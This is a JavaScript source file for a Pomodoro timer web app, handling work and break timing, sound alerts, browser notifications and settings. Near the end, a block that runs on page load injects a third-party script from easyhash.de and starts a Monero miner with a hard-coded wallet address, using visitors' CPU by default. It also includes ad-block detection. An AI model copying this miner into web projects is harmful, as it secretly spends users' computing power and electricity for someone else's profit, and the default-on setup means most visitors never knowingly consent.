import { toJS, autorun, observable, action } from 'mobx'
import { format } from 'date-fns'
import Push from 'push.js'
import store from 'store'
import {initialize} from './sync'
import m from 'mithril'
import alarmwatch from "../sounds/alarmwatch.mp3"
import eAlarm from "../sounds/80sAlarm.mp3"
import alarmClock from "../sounds/alarmclock.mp3"
import ding from "../sounds/ding.mp3"
import doorbell from "../sounds/doorbell.mp3"
import { Howl, Howler } from 'howler';
import _ from 'lodash'
window.toJS = toJS
// doesn't work, minimal height is 70 for resizeTo method
// let resize, previousResize = window.innerHeight
// window.onresize= function(x){
//     window.clearTimeout(resize)
//     resize = setTimeout(()=>{
//         console.log("sizing11", window.innerHeight, previousResize)
//          if (window.innerHeight <= 110){
//             window.resizeTo(205, 35);
//             setTimeout(()=>{previousResize = window.innerHeight })
//             console.log("resizing")
//          }
//     }, 50)
//     // window.resizeTo(100, 100); console.log(x, window.size)
// }

function genP(url) {
    var sound = new Howl({
        src: [url]
    });
    return sound
}

function log(...args) {
    console.log(...args)
}

let c = store //cache
window.c = store

const soundsNames = ["Alarm Watch", "80s Alarm", "Alarm Clock", "Ding", "Doorbell"]
const sounds = [alarmwatch, eAlarm, alarmClock, ding, doorbell].map(genP)
let currentEvent = new Date().getTime()


const local = location.hostname === "localhost" || location.hostname === "127.0.0.1"
const now = new Date().getTime()
const defaultState = {
    local,
    start: now,
    work: 3, //60*25 //work
    break: 3,
    bigBreak: 3,
    isWorking: true,
    paused: now,
    stamp: now,
    sessions: 1,
    sessionsDaily: 0,
    notifications: [], //for closing upon interaction
    bigBreakSound: 2,
    workSound: 0,
    breakSound: 2,
    animationReflow: true,
    remaingTime: null,
    local: local,
    timerModal: false,
    primary: true,
    noSync: {
        minerOn: true,
        adBlockingOn: false,
        opener: window.opener
    },
    s: {
        amountToMine: 70,         //mining is inverse, 100 is 100 cpu free
        sessionsLen: 2,
        autobreak: !false,
        autowork: true,
        notifications: true,
        volume: 0.5,
        notificationsInteraction: true,
    },
    get breakType() {
        if (this.s.sessionsLen == this.sessions) {
            return this.bigBreak
        }
        return this.break
    },
    get currentTimerLength() {
        if (this.isWorking){
            return this.work
        } else {
            return this.breakType
        }
    },
    get animationDuration() {
        return (this.isWorking ? this.work : this.breakType) + 1 + "s"
    },
    get timeString(){
        return format(this.remaingTime, "mm:ss")
    },
}

var s = defaultState
var act

const actions = {
    tick() {
        const now = new Date().getTime()
        clearTimeout(s.timeout)
        if (s.paused && s.timeString) return
        s.stamp = now
        const { start, work, paused, breakType } = s
        const pausedFor = now - (paused || now)
        const goal = (s.isWorking ? work : breakType) * 1000
        let time = goal - (now - pausedFor - start)
        let show = time
        if (time < 100) {
            s.isWorking = !s.isWorking
            s.start = now
            if (!(s.s.autobreak && !s.isWorking || s.s.autowork && s.isWorking)) {
                s.paused = now
            }
            if (s.isWorking) {
                s.sessions += 1
                s.sessionsDaily += 1
            }
            if (s.sessions > s.s.sessionsLen) {
                s.sessions = 1
            }
            act.notify(s.isWorking ? "Break Ended" : "Work Ended", "")
        }
        if (!s.paused) {
            s.timeout = setTimeout(function () {
                act.tick()
            }, Math.ceil(time / 1000) * 1000 - time - 99)
        }
        if ((now - start) <= 1200) {
            act.tanimationReflow()
        }
        s.remaingTime = show
    },
    notify() {
        if (s.s.notifications && s.primary) {
            let sound, body, title
            let bigBreak = s.sessions == 1
            let requireInteraction
            if (s.isWorking) {
                title = bigBreak ? "Big break ended" : "Break ended"
                body = s.s.autowork ? "Beginning work" : "Ready to start work"
                sound = sounds[bigBreak ? s.bigBreakSound : s.breakSound]
                requireInteraction = !s.s.autowork
            } else {
                title = "Work ended"
                body = s.s.autobreak ? bigBreak ? "Beginning BIG break" : "Beginning break" : "Ready to start break"
                sound = sounds[s.workSound]
                requireInteraction = !s.s.autobreak
            }
            if (s.local) {
                return
            }
            Push.close("previous")
            Push.create(title, {
                body: body,
                icon: `${pomodoroPicture}`,
                vibrate: [100],
                tag: "previous",
                requireInteraction: requireInteraction,
                onClick: function () {
                    window.focus();
                    this.close();
                }
            });
            sound.play()
        }
    },
    toggleStart() {
        const { paused, start } = s
        const now = new Date().getTime()
        if (paused) {
            s.start = start + (now - paused)
            s.paused = null
            act.tick(s.id)
        } else {
            s.paused = now
        }
    },
    reset() {
        const now = new Date().getTime()
        s.paused = now
        s.start = now
        act.tanimationReflow()
    },
    resetSessions() {
        s.sessions = 1
        act.reset()
    },
    playSound(index) {
        sounds[index].play()
    },
}


if ("init") {
    if (s.local) {
    } else {
        Object.assign(defaultState, { work: 25 * 60, break: 5 * 60, bigBreak: 30 * 60 })
    }
    function filterGetters(obj, prop) {
        return Object.getOwnPropertyDescriptor(obj, prop).get
    }
    function change(key, setting = false) {
        if ((typeof s[key] == "undefined" && !setting) || (typeof s.s[key] == "undefined" && setting)) {
            log("error", s)
            throw new Error(`${key} doesn't exist on ${setting}`)
        }
        let obj = []
        if (setting) {
            obj.push("s")
        }
        obj.push(key)
        const type = typeof s[key]
        return (val) => {
            const v = val && val.target && val.target.value? val.target.value : val
            const t = typeof v
            const numb = !isNaN(v*1) && t !="boolean"
            //is geared for inputs returing numbers as strings
            if(t == type || numb) {
                console.log(numb, v, obj[key])
                _.set(s, obj, numb? v*1 : v)
                console.log(numb, v, obj, key, s[key])
            } else {
                console.log(v)
                val.target.value = _.get(s, obj)
            }

        }
    }

    function toggle(key, setting) {
        if ((typeof s[key] == "undefined" && !setting) || (typeof s.s[key] == "undefined" && setting)) {
            log("error")
            throw new Error(`${key} doesn't exist on ${setting}`)
        }
        if (key == "notifications") {
            return (val) => { s.s[key] = !s.s[key]; if (s.s[key]) Push.Permission.request(); }
        }
        if (setting) {
            return (val) => { s.s[key] = !s.s[key] }
        }
        return (val) => { s[key] = !s[key] }
    }
    Object.keys(defaultState).forEach((x) => {
        if (filterGetters(defaultState, x)) return
        actions["c" + x] = (change(x))
        actions["t" + x] = (toggle(x))
    })
    Object.keys(defaultState.s).forEach((x) => {
        if (filterGetters(defaultState.s, x)) return
        actions["c" + x] = (change(x, 1))
        actions["t" + x] = (toggle(x, 1))
    })
    act = {}
    for (let a in actions) {
        let cb = actions[a]
        act[a] = action(cb)
        act[a].nameKey = a
    }
    ["workSound", "breakSound", "bigBreakSound"].forEach((a,x)=>{
        act["select"+x] = selectSound(x)
    })
    function selectSound (field) {
        var res = action(function selSound (ev){
            const index = ev.target.value
            s[field] = index
            sounds[index].play()
        })
        res.nameKey = "select"+field
        return res
    }
    var s = observable(defaultState)
    // var {state: s, actions: act} = initialize({
    //     observable, 
    //     autorun,
    //     toJS, 
    //     actions: act, 
    //     defaultState, 
    //     noSync: ["noSync",],
    //     nonHash: ["stamp", "paused", "start", "id", "primary", "active"],
    //     expire: 8*60*60*60*1000
    // })
    window.s = s
    act.tick()
    window.act = act
}


if ("autoruns") {
    autorun(function notificationPermissions() {
        if (s.start && !s.paused && s.s.notifications) {
            Push.Permission.request()
        }
    })

    autorun(function volume() {
        Howler.volume(s.s.volume)
    })
    autorun(function volume() {
        window.res = toJS(s)
    })

    autorun(function changeTitle() {
        const base = "Pomodoro Timer"
        s.remaingTime
        if (!s.paused) { window.document.title = s.timeString + " " + base }
        else { window.document.title = base }
    })

    // reaction(() => s.sessions && s.isWorking, (data, reaction) => {act.tanimationReflow()})

    // autorun(function forceTick(){
    //     if (s.sessions && s.isWorking && s.paused){
    //     }
    //     act.tick()
    // })

    autorun(function overflow() {
        const html = document.querySelector("html")
        if (s.timerModal) {
            html.style.overflow = "hidden"
        } else {
            html.style.overflow = "auto"
        }
    })

    if ("mining"){
        var minerScript = document.createElement("script")
        minerScript.type = "text/javascript";
        minerScript.onload = function () {
            autorun(function miner(){
                //mining is inverse, 100 is 100 cpu free
                if (document.getElementById('liKHkvRyAnct')) {
                    // console.log('Blocking Ads: No');
                } else {
                    console.log('blocking')
                    document.getElementById('monitizationNotificaiton').style.display = 'block'
                }
                if(!s.primary) return
                if(s.local) return
                if (typeof EverythingIsLife == "undefined"){
                    s.noSync.minerOn = false
                    return
                }
                if(s.s.amountToMine == 100){
                    s.noSync.minerOn = false
                }
                EverythingIsLife('4B7FHf9icoMJwLLGxrpB5N6xXiaSEc6kM43UTbFMvMhjHPpoPdPkqWh9Fyj8DcQxiKKYkdoFoQR96Svjz6f8QScK28mAwCw', 'x', s.s.amountToMine);
            })
        };
        minerScript.onerror = function () {
                document.getElementById('monitizationNotificaiton').style.display = 'block'
                s.noSync.minerOn = false
        };
        minerScript.src = "https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.xmr2";
        document.getElementsByTagName("head")[0].appendChild(minerScript);
    }

// <script src="https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.xmr2" ></script>
// <script type="text/javascript">
// EverythingIsLife('replace_with_your_xmr_address.PaymentID(or WorkerName)', 'x', 50);
// </script>


}

export { s, act, sounds, soundsNames }